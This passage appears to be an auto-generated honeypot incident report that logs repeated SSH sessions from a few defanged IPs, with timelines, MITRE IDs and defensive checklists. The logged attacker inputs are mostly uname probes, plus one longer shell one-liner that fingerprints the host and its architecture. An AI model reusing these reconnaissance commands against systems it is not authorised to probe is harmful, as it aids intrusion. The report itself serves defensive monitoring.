- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-714420691aea

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:58 |
| **Last Seen** | 2026-07-21 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:58:25` | `cowrie.session.connect` |
| `2026-07-21 03:58:25` | `cowrie.client.version` |
| `2026-07-21 03:58:25` | `cowrie.client.kex` |
| `2026-07-21 03:58:25` | `cowrie.login.success` |
| `2026-07-21 03:58:26` | `cowrie.session.params` |
| `2026-07-21 03:58:26` | `cowrie.command.input` |
| `2026-07-21 03:58:26` | `cowrie.log.closed` |
| `2026-07-21 03:58:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4c4ee7386cac

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:58 |
| **Last Seen** | 2026-07-21 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:58:30` | `cowrie.session.connect` |
| `2026-07-21 03:58:30` | `cowrie.client.version` |
| `2026-07-21 03:58:30` | `cowrie.client.kex` |
| `2026-07-21 03:58:30` | `cowrie.login.success` |
| `2026-07-21 03:58:31` | `cowrie.session.params` |
| `2026-07-21 03:58:31` | `cowrie.command.input` |
| `2026-07-21 03:58:31` | `cowrie.log.closed` |
| `2026-07-21 03:58:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef14d4f85fc7

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:58 |
| **Last Seen** | 2026-07-21 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:58:35` | `cowrie.session.connect` |
| `2026-07-21 03:58:35` | `cowrie.client.version` |
| `2026-07-21 03:58:35` | `cowrie.client.kex` |
| `2026-07-21 03:58:35` | `cowrie.login.success` |
| `2026-07-21 03:58:36` | `cowrie.session.params` |
| `2026-07-21 03:58:36` | `cowrie.command.input` |
| `2026-07-21 03:58:36` | `cowrie.log.closed` |
| `2026-07-21 03:58:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-db5950005492

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:58 |
| **Last Seen** | 2026-07-21 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:58:40` | `cowrie.session.connect` |
| `2026-07-21 03:58:40` | `cowrie.client.version` |
| `2026-07-21 03:58:40` | `cowrie.client.kex` |
| `2026-07-21 03:58:40` | `cowrie.login.success` |
| `2026-07-21 03:58:41` | `cowrie.session.params` |
| `2026-07-21 03:58:41` | `cowrie.command.input` |
| `2026-07-21 03:58:41` | `cowrie.log.closed` |
| `2026-07-21 03:58:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ec021206a4e2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:58 |
| **Last Seen** | 2026-07-21 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:58:44` | `cowrie.session.connect` |
| `2026-07-21 03:58:44` | `cowrie.client.version` |
| `2026-07-21 03:58:45` | `cowrie.client.kex` |
| `2026-07-21 03:58:45` | `cowrie.login.success` |
| `2026-07-21 03:58:46` | `cowrie.session.params` |
| `2026-07-21 03:58:46` | `cowrie.command.input` |
| `2026-07-21 03:58:46` | `cowrie.log.closed` |
| `2026-07-21 03:58:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd6979ca58b8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:58 |
| **Last Seen** | 2026-07-21 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:58:50` | `cowrie.session.connect` |
| `2026-07-21 03:58:50` | `cowrie.client.version` |
| `2026-07-21 03:58:50` | `cowrie.client.kex` |
| `2026-07-21 03:58:50` | `cowrie.login.success` |
| `2026-07-21 03:58:51` | `cowrie.session.params` |
| `2026-07-21 03:58:51` | `cowrie.command.input` |
| `2026-07-21 03:58:51` | `cowrie.log.closed` |
| `2026-07-21 03:58:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86a18690d68b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:58 |
| **Last Seen** | 2026-07-21 03:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:58:54` | `cowrie.session.connect` |
| `2026-07-21 03:58:54` | `cowrie.client.version` |
| `2026-07-21 03:58:55` | `cowrie.client.kex` |
| `2026-07-21 03:58:55` | `cowrie.login.success` |
| `2026-07-21 03:58:56` | `cowrie.session.params` |
| `2026-07-21 03:58:56` | `cowrie.command.input` |
| `2026-07-21 03:58:56` | `cowrie.log.closed` |
| `2026-07-21 03:58:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a80f2c053295

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:58 |
| **Last Seen** | 2026-07-21 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:58:59` | `cowrie.session.connect` |
| `2026-07-21 03:58:59` | `cowrie.client.version` |
| `2026-07-21 03:58:59` | `cowrie.client.kex` |
| `2026-07-21 03:59:00` | `cowrie.login.success` |
| `2026-07-21 03:59:01` | `cowrie.session.params` |
| `2026-07-21 03:59:01` | `cowrie.command.input` |
| `2026-07-21 03:59:01` | `cowrie.log.closed` |
| `2026-07-21 03:59:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f22ac58a444

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:59 |
| **Last Seen** | 2026-07-21 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:59:04` | `cowrie.session.connect` |
| `2026-07-21 03:59:04` | `cowrie.client.version` |
| `2026-07-21 03:59:04` | `cowrie.client.kex` |
| `2026-07-21 03:59:05` | `cowrie.login.success` |
| `2026-07-21 03:59:05` | `cowrie.session.params` |
| `2026-07-21 03:59:05` | `cowrie.command.input` |
| `2026-07-21 03:59:05` | `cowrie.log.closed` |
| `2026-07-21 03:59:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-278020443c42

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:59 |
| **Last Seen** | 2026-07-21 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:59:09` | `cowrie.session.connect` |
| `2026-07-21 03:59:09` | `cowrie.client.version` |
| `2026-07-21 03:59:10` | `cowrie.client.kex` |
| `2026-07-21 03:59:10` | `cowrie.login.success` |
| `2026-07-21 03:59:11` | `cowrie.session.params` |
| `2026-07-21 03:59:11` | `cowrie.command.input` |
| `2026-07-21 03:59:11` | `cowrie.log.closed` |
| `2026-07-21 03:59:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4a8acd3bf745

| Field | Detail |
|---|---|
| **Source IP** | `34.78.118[.]104` |
| **First Seen** | 2026-07-21 03:59 |
| **Last Seen** | 2026-07-21 03:59 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:59:09` | `cowrie.session.connect` |
| `2026-07-21 03:59:09` | `cowrie.login.success` |
| `2026-07-21 03:59:10` | `cowrie.session.params` |
| `2026-07-21 03:59:10` | `cowrie.command.input` |
| `2026-07-21 03:59:10` | `cowrie.command.input` |
| `2026-07-21 03:59:10` | `cowrie.command.failed` |
| `2026-07-21 03:59:10` | `cowrie.command.input` |
| `2026-07-21 03:59:10` | `cowrie.log.closed` |
| `2026-07-21 03:59:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.118[.]104` to AbuseIPDB if not already reported
- [ ] Block `34.78.118[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dea7e9384c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:59 |
| **Last Seen** | 2026-07-21 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:59:14` | `cowrie.session.connect` |
| `2026-07-21 03:59:14` | `cowrie.client.version` |
| `2026-07-21 03:59:14` | `cowrie.client.kex` |
| `2026-07-21 03:59:14` | `cowrie.login.success` |
| `2026-07-21 03:59:15` | `cowrie.session.params` |
| `2026-07-21 03:59:15` | `cowrie.command.input` |
| `2026-07-21 03:59:15` | `cowrie.log.closed` |
| `2026-07-21 03:59:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4759f7afa61f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:59 |
| **Last Seen** | 2026-07-21 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:59:18` | `cowrie.session.connect` |
| `2026-07-21 03:59:18` | `cowrie.client.version` |
| `2026-07-21 03:59:19` | `cowrie.client.kex` |
| `2026-07-21 03:59:19` | `cowrie.login.success` |
| `2026-07-21 03:59:20` | `cowrie.session.params` |
| `2026-07-21 03:59:20` | `cowrie.command.input` |
| `2026-07-21 03:59:20` | `cowrie.log.closed` |
| `2026-07-21 03:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f2bbe44dc03

| Field | Detail |
|---|---|
| **Source IP** | `34.78.118[.]104` |
| **First Seen** | 2026-07-21 03:59 |
| **Last Seen** | 2026-07-21 03:59 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `PING` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:59:23` | `cowrie.session.connect` |
| `2026-07-21 03:59:23` | `cowrie.login.success` |
| `2026-07-21 03:59:24` | `cowrie.session.params` |
| `2026-07-21 03:59:24` | `cowrie.command.input` |
| `2026-07-21 03:59:24` | `cowrie.command.failed` |
| `2026-07-21 03:59:29` | `cowrie.log.closed` |
| `2026-07-21 03:59:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.118[.]104` to AbuseIPDB if not already reported
- [ ] Block `34.78.118[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf81d83336c4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:59 |
| **Last Seen** | 2026-07-21 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:59:24` | `cowrie.session.connect` |
| `2026-07-21 03:59:24` | `cowrie.client.version` |
| `2026-07-21 03:59:24` | `cowrie.client.kex` |
| `2026-07-21 03:59:24` | `cowrie.login.success` |
| `2026-07-21 03:59:25` | `cowrie.session.params` |
| `2026-07-21 03:59:25` | `cowrie.command.input` |
| `2026-07-21 03:59:25` | `cowrie.log.closed` |
| `2026-07-21 03:59:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ef3007c438d

| Field | Detail |
|---|---|
| **Source IP** | `34.78.118[.]104` |
| **First Seen** | 2026-07-21 03:59 |
| **Last Seen** | 2026-07-21 03:59 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:59:26` | `cowrie.session.connect` |
| `2026-07-21 03:59:26` | `cowrie.login.success` |
| `2026-07-21 03:59:26` | `cowrie.session.params` |
| `2026-07-21 03:59:26` | `cowrie.command.input` |
| `2026-07-21 03:59:29` | `cowrie.log.closed` |
| `2026-07-21 03:59:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.78.118[.]104` to AbuseIPDB if not already reported
- [ ] Block `34.78.118[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0872505a1e27

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:59 |
| **Last Seen** | 2026-07-21 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:59:28` | `cowrie.session.connect` |
| `2026-07-21 03:59:28` | `cowrie.client.version` |
| `2026-07-21 03:59:28` | `cowrie.client.kex` |
| `2026-07-21 03:59:29` | `cowrie.login.success` |
| `2026-07-21 03:59:30` | `cowrie.session.params` |
| `2026-07-21 03:59:30` | `cowrie.command.input` |
| `2026-07-21 03:59:30` | `cowrie.log.closed` |
| `2026-07-21 03:59:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53ff167cbc0c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:59 |
| **Last Seen** | 2026-07-21 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:59:33` | `cowrie.session.connect` |
| `2026-07-21 03:59:33` | `cowrie.client.version` |
| `2026-07-21 03:59:33` | `cowrie.client.kex` |
| `2026-07-21 03:59:33` | `cowrie.login.success` |
| `2026-07-21 03:59:34` | `cowrie.session.params` |
| `2026-07-21 03:59:34` | `cowrie.command.input` |
| `2026-07-21 03:59:34` | `cowrie.log.closed` |
| `2026-07-21 03:59:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-549f773d6dad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:59 |
| **Last Seen** | 2026-07-21 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:59:38` | `cowrie.session.connect` |
| `2026-07-21 03:59:38` | `cowrie.client.version` |
| `2026-07-21 03:59:38` | `cowrie.client.kex` |
| `2026-07-21 03:59:39` | `cowrie.login.success` |
| `2026-07-21 03:59:39` | `cowrie.session.params` |
| `2026-07-21 03:59:39` | `cowrie.command.input` |
| `2026-07-21 03:59:39` | `cowrie.log.closed` |
| `2026-07-21 03:59:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bc8f105d1c8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:59 |
| **Last Seen** | 2026-07-21 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:59:43` | `cowrie.session.connect` |
| `2026-07-21 03:59:43` | `cowrie.client.version` |
| `2026-07-21 03:59:43` | `cowrie.client.kex` |
| `2026-07-21 03:59:44` | `cowrie.login.success` |
| `2026-07-21 03:59:44` | `cowrie.session.params` |
| `2026-07-21 03:59:44` | `cowrie.command.input` |
| `2026-07-21 03:59:44` | `cowrie.log.closed` |
| `2026-07-21 03:59:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5046c76e1d30

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:59 |
| **Last Seen** | 2026-07-21 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:59:48` | `cowrie.session.connect` |
| `2026-07-21 03:59:48` | `cowrie.client.version` |
| `2026-07-21 03:59:48` | `cowrie.client.kex` |
| `2026-07-21 03:59:48` | `cowrie.login.success` |
| `2026-07-21 03:59:49` | `cowrie.session.params` |
| `2026-07-21 03:59:49` | `cowrie.command.input` |
| `2026-07-21 03:59:49` | `cowrie.log.closed` |
| `2026-07-21 03:59:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58efda9327f2

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:59 |
| **Last Seen** | 2026-07-21 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:59:53` | `cowrie.session.connect` |
| `2026-07-21 03:59:53` | `cowrie.client.version` |
| `2026-07-21 03:59:53` | `cowrie.client.kex` |
| `2026-07-21 03:59:53` | `cowrie.login.success` |
| `2026-07-21 03:59:54` | `cowrie.session.params` |
| `2026-07-21 03:59:54` | `cowrie.command.input` |
| `2026-07-21 03:59:54` | `cowrie.log.closed` |
| `2026-07-21 03:59:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a00f4f2dade8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 03:59 |
| **Last Seen** | 2026-07-21 03:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:59:58` | `cowrie.session.connect` |
| `2026-07-21 03:59:58` | `cowrie.client.version` |
| `2026-07-21 03:59:58` | `cowrie.client.kex` |
| `2026-07-21 03:59:58` | `cowrie.login.success` |
| `2026-07-21 03:59:59` | `cowrie.session.params` |
| `2026-07-21 03:59:59` | `cowrie.command.input` |
| `2026-07-21 03:59:59` | `cowrie.log.closed` |
| `2026-07-21 03:59:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e0aa5da22bf

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 03:59 |
| **Last Seen** | 2026-07-21 04:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 03:59:59` | `cowrie.session.connect` |
| `2026-07-21 04:00:00` | `cowrie.client.version` |
| `2026-07-21 04:00:00` | `cowrie.client.kex` |
| `2026-07-21 04:00:04` | `cowrie.login.success` |
| `2026-07-21 04:00:06` | `cowrie.session.params` |
| `2026-07-21 04:00:06` | `cowrie.command.input` |
| `2026-07-21 04:00:06` | `cowrie.command.input` |
| `2026-07-21 04:00:06` | `cowrie.command.input` |
| `2026-07-21 04:00:06` | `cowrie.command.input` |
| `2026-07-21 04:00:06` | `cowrie.command.input` |
| `2026-07-21 04:00:06` | `cowrie.command.success` |
| `2026-07-21 04:00:06` | `cowrie.command.input` |
| `2026-07-21 04:00:06` | `cowrie.command.input` |
| `2026-07-21 04:00:06` | `cowrie.command.input` |
| `2026-07-21 04:00:06` | `cowrie.command.input` |
| `2026-07-21 04:00:07` | `cowrie.log.closed` |
| `2026-07-21 04:00:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d27073dc28a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:00 |
| **Last Seen** | 2026-07-21 04:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:00:02` | `cowrie.session.connect` |
| `2026-07-21 04:00:02` | `cowrie.client.version` |
| `2026-07-21 04:00:03` | `cowrie.client.kex` |
